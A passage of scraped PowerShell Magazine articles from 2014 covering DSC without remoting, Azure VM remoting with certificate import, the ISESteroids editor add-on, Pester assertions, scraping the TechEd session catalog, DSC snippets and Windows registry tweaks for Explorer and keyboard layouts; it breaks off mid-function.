default.\nVerifying that Windows Remote Management is indeed disabled This is straightforward. I just have to see if WinRM service on a target is system is running or not. For this, we can use the Get-Service cmdlet.\nThere are many ways to do this. You can use any of the following methods\n#1. Using Set-WSManQuickConfig Set-WSManQuickConfig #2. Using winrm (do this at the console) winrm quickconfig #3. Enable PS Remoting Enable-PSRemoting -Force There are other methods such as using winrm command to create just the listener or using WSMAN provider to create the listener. On my target system, I just ran the Set-WSManQuickConfig instead of the Enable-PSRemoting as the release notes suggests.\nVerify that WinRM listener is enabled We can do this using the Test-WSMan cmdlet. This tells us that the HTTP listener is created and functional.\nWe can try and remote into the target system and make sure we really have remoting disabled.\nI have a sample DSC configuration that I want to push to the target system where remoting is not enabled. But, remember, I have the listeners still functioning on that.\nConfiguration WinRMDemo { Node WC81-1 { WindowsProcess ProcessDemo { Path=\u0026quot;Notepad.exe\u0026quot; Arguments=\u0026quot;\u0026quot; Ensure=\u0026quot;Present\u0026quot; } } } WinRMDemo Start-DscConfiguration -Path .\\WinRMDemo -Wait -Verbose This is it. We pushed the DSC configuration without enabling remoting on the target system. Using the Enable-PSRemoting cmdlet is probably the easiest way to create WinRM listeners and therefore people might be suggesting it as a method to create WinRM listeners. PowerShell remoting is more than just the WinRM listeners. It includes enabling session configurations and changing permissions to enable remote execution. PowerShell remoting is enabled by default on domain-joined Windows Server 2012 and Windows Server 2102 R2 systems, but it’s not a requirement for DSC.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/01/desired-state-configuration-and-the-remoting-myth/","tags":["PowerShell DSC"],"title":"Desired State Configuration and the remoting myth"},{"categories":["How To","Azure"],"contents":"These days, for all my demos at various events, I have been using Azure VMs extensively. If you have worked on creating these VMs using Azure PowerShell cmdlets, you will notice that they create a PowerShell remoting endpoint for a VM. However, this endpoint requires SSL and therefore certificates.\nLet us see this step by step.\nCreating VM I assume that you already have a cloud service. We will create a VM from the latest Windows Server 2012 R2 image and add it to the existing service.\nGet-AzureVMImage | Where-Object { $_.Label -like \u0026quot;*SERVER 2012 R2*\u0026quot; } | Sort -Property PublishedDate -Descending | Select -Property ImageName,Label The above code snippet gives us the Windows Server 2012 R2 OS images.\n$VMName = \u0026quot;WSR2-3\u0026quot; $UserName = \u0026quot;Ravikanth\u0026quot; $Password = \u0026quot;Y0urPassW0Rd!\u0026quot; $VMLocation = \u0026quot;East US\u0026quot; $VMImage = \u0026quot;a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-R2-201403.01-en.us-127GB.vhd\u0026quot; $ServiceName = \u0026quot;WinVMs\u0026quot; New-AzureVMConfig -Name $VMName -InstanceSize \u0026quot;Small\u0026quot; -ImageName $VMImage | Add-AzureProvisioningConfig -Windows -AdminUsername $UserName -Password $Password | New-AzureVM -ServiceName $ServiceName -Location $VMLocation -WaitForBoot In the above code snippet, we first get the default subscription and set the storage account to the default subscription. If you have multiple subscriptions, you need to set the right subscription storage account here. Also, ensure that $VMLocation is set to the same location as the storage account.\nListing Endpoints We can see the default endpoints created for this VM using the Get-AzureEndpoint cmdlet.\nGet-AzureVM -ServiceName \u0026quot;WinVMs\u0026quot; -Name \u0026quot;WSR2-3\u0026quot; | Get-AzureEndpoint | Select Name, LocalPort, Port As you see, the public port (Port=64434 in the above example) for PowerShell remoting is not the default remoting port. Also, as you might be aware, the DNS name for any VM is DNS name of the cloud service. So, we can use that DNS name and public port to connect to the remoting endpoint in the VM.\nEnter-PSSession -ConnectionUri https://winvms.cloudapp.net:64434 -Credential (Get-Credential -UserName Ravikanth -Message \u0026quot;Password\u0026quot;) This results in an error because the certificate from the cloud service isn’t trusted on the local system. We need to install that certificate.\nInstalling Cloud Service Certificate $WinRMCertificateThumbprint = (Get-AzureVM -ServiceName \u0026quot;WinVMs\u0026quot; -Name \u0026quot;WSR2-3\u0026quot; | Select-Object -ExpandProperty VM).DefaultWinRMCertificateThumbprint (Get-AzureCertificate -ServiceName \u0026quot;WinVMs\u0026quot; -Thumbprint $WinRMCertificateThumbprint -ThumbprintAlgorithm SHA1).Data | Out-File \u0026quot;${env:TEMP}\\CloudService.tmp\u0026quot; $X509Object = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 \u0026quot;$env:TEMP\\CloudService.tmp\u0026quot; $X509Store = New-Object System.Security.Cryptography.X509Certificates.X509Store \u0026quot;Root\u0026quot;, \u0026quot;LocalMachine\u0026quot; $X509Store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite) $X509Store.Add($X509Object) $X509Store.Close() Remove-Item \u0026quot;$env:TEMP\\CloudService.tmp\u0026quot; The above code snippet downloads the certificate from the cloud service and installs it on the local system. Once this step is complete, we can use any of the remoting cmdlets to remote into the Azure VM.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/31/powershell-remoting-with-azure-windows-vms/","tags":["Azure","How To"],"title":"PowerShell Remoting with Azure Windows VMs"},{"categories":["Module Spotlight","ISESteroids"],"contents":"If you love the built-in ISE editor that ships with PowerShell 3.0 and 4.0, but you were missing some professional editor capabilities, then ISESteroids add them for you. It is a commercial PowerShell module that seamlessly integrates with the ISE editor, written by PowerShell MVP Tobias Weltner (me).\nThe primary goal of ISESteroids was to keep the beautiful simple UI, and not turn the editor into something as complex as the control panel of a nuclear power plant. So once you start ISESteroids, you will notice only a few changes. Most of the vast power built into ISESteroids shows up once you need it.\nLet me take you on a quick walk-through! The version I am showing to you is 1.0.3.30. If you have already downloaded an earlier version (the version information appears when you load ISESteroids), make sure you download the latest version.\nInstallation ISESteroids are no separate application. They are a PowerShell module with simple copy/paste deployment. So you neither need Administrator privileges nor other prerequisites to use it.\nSimply get yourself a trial copy here: http://www.powertheshell.com/isesteroids/download/. It downloads as a .zip file. Unfortunately, Google Chrome is confused by the .zip content and spits out a warning. Feel free to run the .zip through your favorite antivirus scanner if you are concerned.\nNext, the single most important step is to unblock the .zip file, or else ISESteroids cannot run. So before you unpack the .zip, right-click it, choose “Properties”, then click “Unblock”.\nOnce you unpacked the .zip file, you get a folder called “ISESteroids”. Simply copy it to your modules folder. If you do not know where that is, run this line in PowerShell to find out the places where PowerShell looks for modules:\n$env:PSModulePath -split ';'  Loading ISESteroids To launch ISESteroids, start the PowerShell ISE editor, then enter this:\nStart-Steroids  This will load the extension in a matter of a few seconds, and after you accepted the EULA (which essentially tells you that you are using ISESteroids on your own risk), you will see additional buttons appear in the toolbar. Also, a help window opens.\nVisual Helpers ISESteroids adds green and blue squiggle lines. They mark code that is OK but does not adhere to best practices. For example, if you use double-quotes with text that does not contain expandable content, it gets a squiggle line. Or, if you use alias names, it again gets squiggled in real-time.\nClick on a squiggle to find out about the problem in the ISE status bar. The status bar also provides links that help you fix the problem. So while you code, you learn about best practices and produce more reliable code on the fly.\nAnother great visual helper is the colorizer that colorizes the current line, so you always know where you are. And if you place your cursor on a brace, the area enclosed by it will be highlighted.\nInstant Help If the help pane is visible, you get help for almost anything you click in your code. So no need anymore for searching manually. ISESteroids comes with help for most default cmdlets, so even if you did not download the PowerShell help files, help is at your fingertips.\nThe help is fully interactive. When you hover over examples in the help, they turn blue, and when you click, the example code is entered into the console or editor. The code will never be executed automatically, though. You still have to press ENTER to actually run the code.\nWhen you hold ALT while you click a cmdlet or other part of your script, help opens in a separate window. This is especially useful if you have a secondary screen. The separate help window uses a tab style interface, so you can open multiple help topics in one window.\nInstant Completion Are you tired of entering always the same control structures? Try this: enter func, then hold SHIFT and add a space. The auto-completion add-on appears and suggests a couple of commonly used function definitions. Simply use your arrow keys to select the one you need, press ENTER, and you are done.\nThe same works with many other keywords such as if, else, or try. It is not yet complete and will be expanded.\nAuto-Indent It takes just a click on the auto-indent button (or ALT+I) to automatically indent braces. ISESteroids changes the default indent from 4 to 2, but if you’d like to adjust this, simply right-click the auto-indent button in the toolbar and choose indent size and indent type. Your changes will be applied the next time you use automatic indent.\nNavigation Bar ISESteroids adds an optional navigation bar on top of your script. You can show and hide it via ALT+N. It sports a drop-down list on the left with all of the functions in your script for easy navigation. On the right, you get a real-time search box. Anything you enter here will be highlighted in the editor, using multiple selections. When you press ENTER in this search field, ISESteroids take you to the next highlighted instance.\nAnd when you right-click on a function you use elsewhere in your script, the context menu now sports a “Go To Definition” that takes you to the function definition.\nIf the function resides in a separate script or module, it is opened in a separate script pane.\nSmart Selection ISESteroids supports language-based selections. Simply place your cursor into a PowerShell statement, and press CTRL+Q. The expression the cursor is in will be selected, and the status bar tells you what the expression is. Press CTRL+Q again to select the parent expression. By pressing CTRL+Q multiple times, you can easily select exactly the code you want.\nBlock Commenting To comment code out, select the code, then press CTRL+B. The code is enclosed in a block comment. The same keyboard shortcut uncomments again.\nAnd when you right-click on a comment, you can remove this comment or all comments via new commands in your context menu.\nVariable Monitor To open the built-in variable monitor, click on the “eye” toolbar button. The variable monitor has a blue selection menu at the right side of the text filter box. By default, it shows only user variables, but if you want, you can also view system variables or all variables.\nRight-click a variable and choose “Monitor” to place it on a custom watch list.\nThe variable monitor updates after each execution, so you can actually watch your variables change as you go, even during debugging.\nWhen you right-click a variable in the variable monitor, you can enable sophisticated debugger breakpoints such as “Break on read”, “Break on write”, or “Break on type change”. “Break on type change” breaks whenever a variable changes data type.\nDebugger Enhancements ISESteroids adds a new “bug” toolbar button that enables you to set and clear breakpoints easily (provided you have saved your script first, because debugging is generally only supported with files).\nOnce PowerShell hits a breakpoint, additional buttons become visible that enable you to easily step in, step over or out, and to stop the debugging session.\nScript Pane Management When you have multiple script panes open, right-click on a script pane tab to open a context menu. It allows you to “Close All Others”, or discard untitled documents. It also includes commands to send your current script via email as attachment, a .zip file, or protected .zip file, for example if you want to share it with a colleague.\nFine Tuning Almost everything can be tailored to your needs. Click the “blue pill” toolbar button to open an additional toolbar. It lets you enable and disable a lot of the editing wizards–for example, you can turn on and off the squiggles, or the quote completion.\nRight-clicking a button in this secondary toolbar lets you open help, or change settings. For example, you can freely adjust the selection colors to your taste.\nCode Signing To digitally sign a script, simply click the sign script button in the toolbar. It looks like a document with a pen. If you have a code-signing certificate installed, it is used. Else, ISESteroids offers to create one for you. Right-click the button to see more signing options.\nWith the “spy glass” toolbar button, you can then check the current script. It will tell you if there is a signature, if it is valid, and who exactly signed the script.\nWhen you right click a digital signature, you can validate the signature or remove it, right from the context menu.\nDecompiling Cmdlets If you’d like to know what exactly occurs inside a cmdlet, simply right-click it and choose “Source Code”-\u0026gt; “Decompile”. The free ILSpy decompiler opens and presents you with the cmdlet source code. This works with raw .NET types as well.\nThe same menu also allows you to derive proxy functions from cmdlets or turn a cmdlet into a PowerShell function, so you can better understand how you would define parameters in your own functions.\nCreating Functions from Selection Typically, when you play with PowerShell, you will eventually end up with code similar to this:\n$text = 'Hello World!' $rate = 0 $obj = New-Object -ComObject Sapi.SpVoice $obj.Rate = $rate $null = $obj.Speak($text) This would for example speak out the text in $text, at least if you enabled your speakers.\nTo turn ad-hoc code like this into a PowerShell function, simply select the entire code, then right-click the selection and choose “Turn into function”. A wizard opens.\nPlease note: prior to ISESteroids version 1.0.3.30, the wizard had a bug that could cause an exception, so make sure you are using at least this version.\nFirst choose a function name in the upper part: a drop-down box offers all of the approved PowerShell verbs.\nNext, look at the list of variables that the wizard would turn into function parameters. Deselect “-obj” because you want to keep this variable private. Once you click OK, the function is generated and will look like this:\nfunction Out-Voice { \u0026lt;# .Synopsis Short Description .DESCRIPTION Detailed Description .EXAMPLE Out-Voice explains how to use the command can be multiple lines .EXAMPLE Out-Voice another example can have as many examples as you like #\u0026gt; [CmdletBinding()] param ( [Parameter(Mandatory=$false,Position=0)] [System.String] $text = 'Hello World!', [Parameter(Mandatory=$false,Position=1)] [System.Int32] $rate = 0 ) $obj = New-Object -ComObject Sapi.SpVoice $obj.Rate = $rate $null = $obj.Speak($text) } Take a minute to fill out the help block so your new function gets PowerShell help.\nTurning Functions into Modules Once you have created a function, you can easily move it into your very own PowerShell module. Simply right-click the “function” keyword, and choose “Export To Module”.\nA wizard opens. You can either enter the name of a brand new module you want to create, or–if you have created modules with this wizard before–you can choose an existing module to host your function.\nThat’s it. The module is created, and you can use your new command in all PowerShell shells, without restart or loading anything.\nThere is a lot more in ISESteroids, but this quick walk-through hopefully has given you a good starting point for your own test drive.\nRemember that ISESteroids is a commercial project. It will run for free for 10 distinct testing days. After that, you need a license. License revenues will fund this project, so if you like what you see, the ISESteroids makers greatly appreciate if you do your share and provide some revenue.\nLicense lasts forever for the version you purchased. There is an introductory offer going on right now that includes 1-year free support and 1-year free updates.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/28/isesteroids-a-revolutionary-powershell-ise-add-on/","tags":["Modules","ISESteroids"],"title":"ISESteroids – A Revolutionary PowerShell ISE Add-On"},{"categories":["DevOps","Pester"],"contents":"This is part two of Pester series of articles. In this article you will learn about the Context keyword, how to use all the assertions available in Pester and a bit about best practices.\nNote: The previous article showed how to install Pester, established some of the basic terms and a “Hello World” example. I recommend reading it before you proceed with this article.\nTo support you in using natural language, Pester uses a set of keywords that were carefully chosen to form a fluent domain-specific-language (DSL). You start by using the Describe block to define what you are testing. Then you use Context to explain the circumstances. And then you use It and Should to define the tests themselves. You already learned how to use Describe and It. Let’s take a look at the rest.\nContext Context has a very similar function to the Describe keyword. It lets you create groups of tests inside Describe blocks. These blocks usually define the “context” in which the tests are run. As with Describe, Context is followed by a description and a script block.\nDescribe \"Get-Item\" { Context \"no parameter is provided\" { It \"fails\" { { Get-Item } | Should Throw } } Context \"path is provided\" { It \"returns the correct item\" { ( Get-Item -Path C:\\Windows ).FullName | Should Be 'C:\\Windows' } It \"works when Path parameter is specified by position\" { { Get-Item C:\\ } | Should Not Throw } } }  Context also forms a separate scope in TestDrive. We will cover the details about that in the next article.\nPlacing a ScriptBlock Although I call the Describe, the Context and It keywords, they are just a mere functions exported by the Pester module. This limits the way you can provide script blocks to their parameters. You have to place the opening brace on the same line as the keyword or use a backtick (`) to escape the end of the line. Placing the braces as in the following example will fail:\nContext \"defines script block incorrectly\" { #some tests }  This limitation is the same for every function or cmdlet taking the -ScriptBlock parameter, even the ForEach-Object cmdlet which is natively provided with PowerShell has this limitation.\nAssertions An assertion determines if your test passes or fails by taking actual and expected values and comparing them in some way. In the example shown in the previous article, you used the Should Be assertion as such:\nGet-HelloWorld | Should Be 'Hello world!'  The actual value in this case was the output of the Get-HelloWorld function. The expected value was the ‘Hello world!’ string. If these two values were equal the assertion passed, if they weren’t the assertion failed. As you can see, the actual value is provided by pipeline and the expected value is placed after the Should Be keyword. All the other Pester assertions are used in the same manner–only the way the values are compared is different.\nThe assertions are:\n Should Be Should BeExactly Should BeNullOrEmpty Should Match Should MatchExactly Should Exist Should Contain Should ContainExactly Should Throw  All of these assertions also have a negative version that passes where the positive assertion fails. (And the other way around of course.) Let’s use the negative version of the Should Be assertion. We already know how to make sure the version of PowerShell we are using is not 1:\n$PSVersionTable.PSVersion.Major | Should Not Be 1  By placing Not between the Should keyword and the name of the assertion, I negated the result of the assertion. So instead of passing ‘if the input was equal to 1’ it will fail. This is not particularly useful for the Should Be assertion, but it is the only assertion we know so far. So let’s broaden our knowledge and take a look on each of Pester assertions (All the examples shown form a passing assertion).\nShould Be A Should Be assertion is the most versatile assertion you can find in Pester and you will likely use it the most often. In general it is used like this:\n\u0026lt;Actual value\u0026gt; | Should Be \u0026lt;Expected value\u0026gt; The words wrapped in \u0026lt;\u0026gt; are just placeholders for the actual values. A notation I will use throughout this article to not overwhelm you with details. In reality you of course do not use the \u0026lt;\u0026gt; to enclose your actual and expected values.\nInside the assertion the standard -eq operator is used to determine if the actual value and the expected value are equal. This has two implications: the assertion is case insensitive and references are compared when objects are compared. Keep that in mind when you write your tests.\nLet’s see another example usage:\n$Process = Get-Process -Name Idle $Process.Name | Should Be Idle  Should BeNullOrEmpty This assertion tests if the value provided is null or empty and is used as such:\n\u0026lt;Value\u0026gt; | Should BeNullOrEmpty In my opinion the negative version of this assertion is more useful than the positive one. You will usually use it to test if your function returns any output.\nGet-Help | Should Not BeNullOrEmpty  Should Match This assertion tests if a given string matches a regular expression.\n\u0026lt;String\u0026gt; | Should Match \u0026lt;Pattern\u0026gt; \"PowershellMagazine.com\" | Should Match \"\\.com$\"  Should Exist This assertion tests if an item (file, folder, registry path…) exists.\n\u0026lt;Path\u0026gt; | Should Exist You will likely use it to test if file or folder exists, but it can test also Registry and other paths. Inside this assertion the Test-Path cmdlet is used, so you can test any path Test-Path can handle.\n\"C:\\Windows\" | Should Exist  Should Contain This assertion tests if a file contains a given string.\n\u0026lt;Path\u0026gt; | Should Contain \u0026lt;Pattern\u0026gt; Inside this assertion the -match operator is used, so you use regular expressions to define the string you are looking for. This gives you a lot of power to make advanced tests, but on the other hand it makes the simple tests a bit more complicated. You have to look out for any characters that have special meaning in RegEx and escape them by “\\”. If you are as lazy as I am or you determine the value on runtime so you don’t know the value beforehand, you can use a trick to force the assertion do “simplematch” (as-is match):\n\u0026lt;Path\u0026gt; | Should Contain ([regex]::Escape(\u0026lt;Pattern\u0026gt;)) Should Throw This assertion tests if a given script block throws an exception (a terminating error).\n{ \u0026lt;Code\u0026gt; } | Should Throw Notice that the code is enclosed in braces and as a result you are passing a script block to the assertion. This assertion is one of my favorites, but unfortunately it does not support testing for specific exceptions at the moment.\n{ Get-Process -Name \"!@#$%\u0026\" -ErrorAction Stop } | Should Throw  Case sensitive assertions The Should BeExactly, Should MatchExactly and Should ContainExactly are case sensitive versions of the Should Be, Should Match and Should Contain assertions. Doing case sensitive comparison makes sense only when you compare strings or characters. If you compare types like Integers, Booleans and others, using the case sensitive assertion has no effect on the result. In such cases I recommend using the standard assertions instead.\nMultiple assertions You can place more assertions inside a single It block, but keep in mind that each test should have only a small span of concern. Ideally it should depend on a single condition. But if it makes sense to use multiple assertions, nothing is stopping you from doing that. In such case the first assertion to fail, fails the whole test.\nCustom assertions If you cannot find an assertion that suits your problem, you can always use the Should Be and test for a Boolean. For example like this:\n( \"String\" -is [String] ) | Should Be $true  Or you can skip the assertion entirely and just throw when the test should fail.\nif ( \"String\" -isnot [String] ) { throw \"The 'String' is not a String.\" }  Although this costs you the nicely formatted output Pester provides when the test fails.\nYou can also go to the Pester issue page and report a new issue there.\nPowerShell 2.0 compatibility Pester is PowerShell 2.0 compatible and as long as PowerShell 2.0 will be relevant Pester will support it. But there is a really specific problem in PowerShell 2.0 that might make your tests act strangely. Let’s say for example you use a Get-DatabaseData function to get in user information and you want to fail the test if no data are returned:\nfunction Get-DatabaseData ($User) {} function HasValue { param ( [Parameter(ValueFromPipeline=$true)] $Value ) process { $allValues += $Value } end { ($allValues -ne $null) -and (-not [string]::IsNullOrEmpty($AllValues)) } } Two functions are defined in this script: Get-DatabaseData function that produces no output, because the user was not found in the db. And a simplified version of Should Not BeNullOrEmpty assertion I named HasValue to make the examples easier to understand. Let’s check if the “assertion” works:\nGet-DatabaseData –User Jakub | HasValue  As expected the “assertion” produces false because the Get-DatabaseData produced no output.\nNow let’s make a small, seemingly harmless change and wrap the function into brackets and assert again:\n( Get-DatabaseData –User Jakub ) | HasValue  In PowerShell 3.0 or later this produces false again. But running the same script in PowerShell 2.0 produces no output! The command in brackets is evaluated, but for some reason the rest of the pipeline is not processed.\nTrying the same but using a sub-expression instead of brackets:\n$( Get-DatabaseData –User Jakub ) | HasValue  Again this produces false in PowerShell 3.0 and no output in PowerShell 2.0.\nThis is pretty serious problem for Pester, if there is no failed assertion the test passes. So a test containing two negative assertions passes even though it should fail:\nIt \"Passes in PowerShell 2.0\" { ( Get-DatabaseData –User Jakub ) | Should BeNullOrEmpty ( Get-DatabaseData –User Jakub ) | Should Not BeNullOrEmpty }  To avoid this issue do not surround your functions with brackets or sub-expressions. Even if you are not using PowerShell 2.0. You’ll save someone from lot of debugging if he runs your tests on PowerShell 2.0.\nStrangely enough both of these produce the correct output (false) in PowerShell 2.0 and later:\n$() | HasValue (\"\") | HasValue  Writing your tests All of the good books on programming I’ve ever read contained a recommendation that went along those lines: write your code like you should maintain it for the rest of your life. For me this is a very important advice. It does not mean making the code perfect. It rather means you should do your best to make your code readable, easy to understand, and easy to debug. The same holds true for your tests. Write tests that you’d love to inherit when taking over a project. Write tests that you’d love to read.\nKeeping this rather difficult goal in mind I always start with thinking about what the code should do. Instead of thinking about how the code should do it. The more of the technical details I hide from myself the better. I use descriptions, comments, functions and nice variable names to abstract the problem I am solving.\nI briefly mentioned this in the previous article. The what is the specification and the how is the implementation. If the difference between what and how is not clear I hope comparing these two example tests will help:\n#test one It \u0026quot;Additional info set to 'm'\u0026quot; { $user.AdditionalInfo[3] | should be 'm' } #test two It \u0026quot;User is manager\u0026quot; { $isManager = $User.AdditionalInfo[3] -eq 'm' $isManager | Should Be $true } The first test starts from how (the fourth character of the additional info is set to ‘m’) and leaves what (or why) for you to figure out. This is highly impractical if you have a large test-base and look for tests testing a specific feature, not to mention your code is tested but the tests do not serve as easy-to-read specification.\nThe second test starts from what (is the user a manager?), giving you the choice to find out how (again fourth character is ‘m’) __if you need.\nThat example may look bit stretched or obvious but I’ve seen so many tests and scripts that only said how without even mentioning why, to feel obligated to point this out.\nYou also shouldn’t re-implement your tests in your functions and keep your tests independent on the environment. Mocking and TestDrive helps a lot with the latter, and we will cover these in the next article.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/27/testing-your-powershell-scripts-with-pester-assertions-and-more/","tags":["DevOps","Pester"],"title":"Testing your PowerShell scripts with Pester: Assertions and more"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nTechEd North America 2014 has a nice Content Catalog page. It provides a few useful search criteria to filter the content and find the sessions you are mostly interested in. That’s great, but I wanted to search the content catalog using PowerShell. While we wait for TechEd team to make the content catalog available as an OData web service, we can try to scrap the needed information about sessions from the Content Catalog page.\nAt first, I’ve tried to fetch the page with the Invoke-WebRequest cmdlet and use the ParsedHtml property and GetElementsByTagName() method, but that was painfully slow. Then I’ve remembered that I have friends, Tobias and Jakub, who are very good with Regular Expressions. Regular Expressions are an esoteric art and difficult to get right, but, luckily, these two guys know their RegEx.\nAnother challenge was the way how authors of the Content Catalog page deal with the paging. By default, you will get results in the chunks of 10 per result page. With some help of browser’s developer tools, Jakub’s found out we can modify the URL using the “take” parameter and ask for more (there are 600+ session, so we used “take=1000” to get them all).\nAt the end, we output a custom PowerShell object with sessions’ details and wrap it as a reusable Search-TechEdNA2014ContentCatalog function:\nfunction Search-TechEdNA2014ContentCatalog { param ( # by default you'll get all sessions from a content catalog [string]$Keyword = '' ) $Uri = 'http://tena2014.eventpoint.com/Topic/List?format=html\u0026amp;take=1000\u0026amp;keyword=' + $Keyword $Results = Invoke-WebRequest -Uri $Uri $Results.RawContent -replace \u0026quot;\\n\u0026quot;,\u0026quot; \u0026quot; -replace \u0026quot;\\s+\u0026quot;,\u0026quot; \u0026quot; -replace \u0026quot;(?\u0026lt;=\\\u0026gt;)\\s+\u0026quot; -replace \u0026quot;\\s+(?=\\\u0026lt;)\u0026quot; -split 'class=\u0026quot;topic\u0026quot;' | select -skip 1 | foreach { $Speaker = if ( $_ -match 'Speaker\\(s\\):.*?\u0026lt;/div\u0026gt;' ) { $matches[0] -split \u0026quot;,\u0026quot; -replace \u0026quot;.*a href[^\u0026gt;].*?\u0026gt;\u0026quot; -replace \u0026quot;\u0026lt;/a.*\u0026quot; | foreach { $_.Trim() } } $Title = if ( $_ -match 'Class=\u0026quot;title\u0026quot;.*?href.*?\u0026gt;(.*?)\u0026lt;' ) { $Matches[1].Trim() } $Track = if ( $_ -match \u0026quot;Track:.*?\u0026gt;(.*?)\u0026lt;\u0026quot; ) { $Matches[1].Trim() } $SessionType = if ( $_ -match \u0026quot;Session Type:.*?\u0026gt;(.*?)\u0026lt;\u0026quot; ) { $Matches[1].Trim() } $Date = if ( $_ -match 'class=\u0026quot;session\u0026quot;\u0026gt;(.*?)\u0026lt;' ) { $Matches[1].Trim() } $Description = if ( $_ -match 'class=\u0026quot;description\u0026quot;\u0026gt;(.*?)\u0026lt;' ) { $Matches[1].Trim() } [pscustomobject]@{ Date = $Date Track = $Track SessionType = $SessionType Speaker = $speaker Title = $Title Description = $Description } } }  What is the best way to use this function? Pipe its output to a grid view window, do some additional filtering if you like and output the results to the console:\nSearch-TechEdNA2014ContentCatalog -Keyword powershell | Out-GridView -PassThru Or, export the results to a CSV file and open it in Excel:\nSearch-TechEdNA2014ContentCatalog -Keyword azure | Out-GridView -PassThru | Select Date, @{n='Speaker(s)';e={$_.Speaker -join ', '}}, Title | Export-Csv $env:temp\\sessions.csv -NoTypeInformation Invoke-Item $env:temp\\sessions.csv ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/26/pstip-explore-teched-na-2014-sessions-with-powershell/","tags":["Tips and Tricks"],"title":"#PSTip Explore TechEd NA 2014 sessions with PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or above.\nPowerShell ISE 4.0 comes with just two DSC-related snippets (DSC Configuration (simple) and DSC Resource Provider (simple)). (Be aware that DSC Configuration (simple) snippet has a bug and uses the Requires property instead of new DependsOn property.).\nWhat about DSC resources? How can we get info about their properties and valid values? You can take the cursor to the place where you have the name of the resource, press CTRL+Space, and a resource syntax will pop up:\nBut, wouldn’t it be nice if we could get DSC snippets with a syntax for all our DSC resources? Luckily, the Get-DscResource cmdlet has the -Syntax parameter that we can use:\nPS C:\\\u0026gt; Get-DscResource -Name service -Syntax Service [string] #ResourceName { Name = [string] [ BuiltInAccount = [string] { LocalService | LocalSystem | NetworkService } ] [ Credential = [PSCredential] ] [ DependsOn = [string[]] ] [ StartupType = [string] { Automatic | Disabled | Manual } ] [ State = [string] { Running | Stopped } ] }  The easiest way to create DSC snippets is to enumerate all DSC resources, get the syntax using the Get-DscResource cmdlet, and pass it to New-IseSnippet cmdlet. Let’s wrap all that in a simple function called New-DscSnippet:\nfunction New-DscSnippet { $resources = Get-DscResource | select -ExpandProperty name foreach ($resource in $resources) { $text = Get-DscResource -Name $resource -Syntax New-ISESnippet -Text $text -Title \u0026quot;DSC $resource Resource\u0026quot; -Description \u0026quot;Full DSC $resource resource syntax\u0026quot; -Force } }  Get-DscResource is a very slow cmdlet and this function will need quite some time to create all DSC snippets, but at the end you will get very usable code snippets to use from now on.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/25/pstip-create-your-own-dsc-resource-snippets-in-powershell-ise/","tags":["Tips and Tricks"],"title":"#PSTip Create your own DSC resource snippets in PowerShell ISE"},{"categories":["Tips and Tricks"],"contents":"When you double click the “This PC” desktop icon in Windows 8 you get the familiar “My Computer” window which includes several groups such as Devices and drives,_ Folders_, _Network locations_ (in case you have mapped drives), etc.\nPersonally I don’t like the Foldersgroup. I can collapse it and hide its content but I prefer not seeing it at all as I can get to each item it has via the left-hand side explorer tree. Each folder in the Folders group is represented by a Registry key under the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace registry path.\nAs you can see the keys do not have a readable name, instead GUIDs are in use. Here’s how they map to folder names:\nDesktop Folder – B4BFCC3A-DB2C-424C-B029-7FE99A87C641 Documents Folder – A8CDFF1C-4878-43be-B5FD-F8091C1C60D0 Downloads Folder – 374DE290-123F-4565-9164-39C4925E467B Music Folder – 1CF1260C-4DD0-4ebb-811F-33C572699FDE Pictures Folder – 3ADD1653-EB32-4cb0-BBD7-DFA0ABB5ACCA Videos Folder – A0953C92-50DC-43bf-BE83-3742FED03C9C  In addition, there’s another key under that path, DelegateFolders. To remove a specific folder, remove its Registry key. In my case I wanted to remove the whole group. So, PowerShell to the rescue (you might want to back up the NameSpace key before you modify it).\n$path = 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace' Get-ChildItem $path | Where-Object { $_.PSChildName -as [guid] } | Remove-Item In the above example, I list all keys under the NameSpace key and exclude the DelegateFolders key by filtering all key names that can cast to a GUID, then I remove them.\nWhen I reopen the This PC window, they are all gone 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/03/24/pstip-how-to-remove-the-folders-group-from-my-computer-in-windows-8/","tags":["Tips and Tricks"],"title":"#PSTip How to remove the “Folders” group from my computer in Windows 8"},{"categories":["How To"],"contents":"While we worked on Windows 8.1 deployment, we were required to make multiple keyboard layouts available on the Windows logon screen. All our computers came pre-staged with standardized corporate image, so we were not able to put these settings directly into the image. The only possible solution seemed to be using the Control panel \u0026gt; Region and Language Settings \u0026gt; Administrative \u0026gt; Copy settings…\nBut that would require clicking through the GUI on every staged computer and I needed a way to automate it. I used ProcessMonitor.exe to see what is happening when I click the OK button in the dialog, but unfortunately that did not help.\nI needed a different idea, so I started thinking: The logon screen is in fact LogonUI.exe that is running in the context of the System account. I searched the web and found that the settings for normal user are located in: HKEY_CURRENT_USER\\Keyboard Layout\\Preload. And mine looked like this:\nCurrent user hive of the _SYSTEM _account is HKEY_USERS.DEFAULT and luckily Keyboard Layout\\Preload key was there. I copied my settings there and restarted the station, hoping for the best.\nWhen the station booted back to the logon screen, the correct keyboard layouts were available there, so this approach should work. Copying the Registry values from one place to another might work but I wanted something more intuitive and flexible.\nThe International module, introduced in Windows 8 and Windows Server 2012, provides *-WinUserLanguageList cmdlets to manage the keyboard layouts of the current user and I wanted my function to integrate with them nicely.\nThe Set-WinUserLanguageList prompts for confirmation and also warns you if some of the provided languages were invalid and I wanted that behavior too, so this is the function I ended up with:\nfunction 